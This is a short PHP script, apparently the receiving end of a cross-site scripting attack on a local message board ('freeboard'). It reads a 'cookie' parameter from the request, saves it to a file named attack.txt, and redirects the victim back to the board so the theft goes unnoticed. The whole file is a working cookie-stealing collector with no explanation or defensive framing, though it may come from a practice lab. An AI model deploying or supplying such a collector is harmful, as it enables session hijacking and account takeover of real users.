<?php
$cookie = $_GET[cookie];
$f = fopen("attack.txt", "w");
fwrite($f, $cookie);
fclose($f);
header('Location: http://127.0.0.1:80/freeboard');


?>
